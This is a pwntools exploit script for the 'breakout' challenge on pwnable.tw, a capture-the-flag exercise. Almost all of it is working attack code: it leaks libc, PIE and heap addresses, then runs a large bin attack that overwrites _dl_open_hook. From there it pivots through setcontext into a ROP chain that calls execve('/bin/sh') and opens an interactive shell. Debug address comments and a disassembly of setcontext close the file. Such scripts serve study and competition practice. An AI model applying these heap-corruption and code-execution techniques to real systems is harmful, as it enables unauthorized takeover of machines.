from pwn import*
p = process('./breakout')
#p = remote('chall.pwnable.tw',10400)
t=0.05
# gadget 
ret = 0x937
leave_ret = 0x42351

# def
def menu(sel):
	p.sendafter('> ', sel)

def note(cell,size,note):
	menu('note')
	p.sendafter('Cell: ',str(cell))
	p.sendafter('Size: ',str(size))
	p.sendafter('Note: ',note)

def punish(cell):
	menu('punish')
	p.sendafter('Cell: ',str(cell))

####### ======= exploit ======= #######
### libc leak & heap leak & PIE base leak
menu('A')		# Unknown command 
note(9,0x200,'A'*8)
menu('list')
#p.recvuntil('A'*8)
'''
for i in range(0,16):
	tmp = u64(p.recv(8))
	print(hex(tmp-9922288))
'''

main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = main_arena - 0x3c4b78
log.info('main_arena : {}'.format(hex(main_arena)))
log.info('libc_base  : {}'.format(hex(libc_base)))
p.recv(0x8*8+2)
PIE_base = u64(p.recv(6).ljust(8,'\x00'))-0xf77
log.info('PIE_base   : {}'.format(hex(PIE_base)))

p.recv(2)
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x124c0
log.info('heap_base  : {}'.format(hex(heap_base)))
### Large bin attack
# == Setting == #
setcontext_53 = libc_base + 293749

note(8,0x300,'A'*8)	# pre chunk p1
note(7, 0x20,'B'*8)	# block consolidate

fake_info = 'Q'*0x488 + p64(0x51)
fake_info += p64(0)+p64(heap_base+72928)
fake_info += p64(heap_base+72960)+p32(0x28)+p32(0xa)
fake_info += p64(heap_base+72992)+p64(0x70)
fake_info += p64(heap_base+78080)+p64(0)
#fake_info += p64(0)+p64(0x71)
#fake_info += 'X'*8
note(6,0x500,fake_info)	# pre chunk p2 + fake_chunk For linked list

pop_rdi = libc_base + 0x21102
pop_rsi = libc_base + 0x202e8
pop_rdx = libc_base + 0x1b92
pop_rax = libc_base + 0x33544
syscall = libc_base + 0x26bf

rop_addr = 78368
pay = 'D'*0x20 + p64(libc_base + ret)      	# setcontext+53
note(5, 0x28, pay )	# block consolidate *(dl_open_hook)
rop = ''
rop += 'b'*(0x90-len(rop))
rop += p64(heap_base+rop_addr)	# rsp
rop += p64(libc_base+ret)	# rcx
rop += 'c'*(0xc0-len(rop))
rop += p64(pop_rdi)
rop += p64(heap_base+78440)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(0)
rop += p64(pop_rax)
rop += p64(59)
rop += p64(syscall)
rop += '/bin/sh\x00'
note(4,0x500, rop )	# pre chunk p3 -> [ rdi+ 0x?? ]
note(3, 0x20,'F'*8)	# block consolidate

note(8,0x320,'A'*8)	# chunk p1
note(6,0x520,'C'*8)	# chunk p2
note(2, 0x20,'G'*8)	# unsorted bin : p1 & large bin : p2
note(4,0x520,'E'*8)	# chunk p3

# == Control p2 == #
c4 = 73664
c6 = 74096
punish(0)		# For overwriting chunk p2
fake_info = ''		# Offset as ...
fake_info += p64(0)+p64(heap_base+72928)
fake_info += p64(heap_base+72960)+p32(0x28)+p32(0x0)
fake_info += p64(heap_base+72992)+p64(0x40)
#fake_info += p64(heap_base+c6)+p64(heap_base+78144-0x90)
fake_info += p64(heap_base+76816)+p64(heap_base+78144-0x90)
note(0,0x40, fake_info)	# As a result, cell_10 note is chunk p2
			# We can overwriting p2
menu('list')
p.recvuntil('Cell: 0\n')
p.recvuntil('Note: ')
for i in range(0,8):
        tmp = u64(p.recv(8))
        print(hex(tmp))

target = libc_base + 3969760 	# &_dl_open_hook
fake_bk = ''
fake_bk = p64(0) + p64(0x501)	# fake_size(smaller than p3)
fake_bk += p64(main_arena) + p64(target-0x10)
fake_bk += p64(main_arena) + p64(target-0x20)
note(0,0x30, fake_bk)	# overwriting chunk p2 bk, bk_nextsize
note(1, 0x90,'H'*8)	# unsorted bin : p1 & large bin : p2->p3
pay = ''
pay += p64(0)*2*5
pay += p64(libc_base+ret)+p64(setcontext_53)
note(10,0x60,pay)
# == Trigger == # (with. abort())
raw_input()
menu('note')
p.sendline('0')
p.sendline('99999')
p.interactive()

# 0x555555769c10 : cell_0's next list
# 0x55555576ac10 : p2 chunk addr
# 0x55555576a3b0 : head chunk
# 0x55555576b150 : *(dl_open_hook)

# 0x000055555576a3b0 - 9
# 0x000055555576a2f0 - 8
# 0x000055555576a230 - 7
# 0x000055555576a170 - 6
# 0x000055555576a050 - 5

# 0x0000555555769fc0 - 4
# 0x0000555555769ef0 - 3
# 0x0000555555769df0 - 2
# 0x0000555555769d60 - 1
# 0x0000555555769c20 - 0
'''
   0x7ffff71b3b75 <setcontext+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
   0x7ffff71b3b7c <setcontext+60>:	mov    rbx,QWORD PTR [rdi+0x80]
   0x7ffff71b3b83 <setcontext+67>:	mov    rbp,QWORD PTR [rdi+0x78]
   0x7ffff71b3b87 <setcontext+71>:	mov    r12,QWORD PTR [rdi+0x48]
   0x7ffff71b3b8b <setcontext+75>:	mov    r13,QWORD PTR [rdi+0x50]
   0x7ffff71b3b8f <setcontext+79>:	mov    r14,QWORD PTR [rdi+0x58]
   0x7ffff71b3b93 <setcontext+83>:	mov    r15,QWORD PTR [rdi+0x60]
   0x7ffff71b3b97 <setcontext+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
   0x7ffff71b3b9e <setcontext+94>:	push   rcx
   0x7ffff71b3b9f <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
   0x7ffff71b3ba3 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
   0x7ffff71b3baa <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
   0x7ffff71b3bb1 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
   0x7ffff71b3bb5 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
   0x7ffff71b3bb9 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
'''
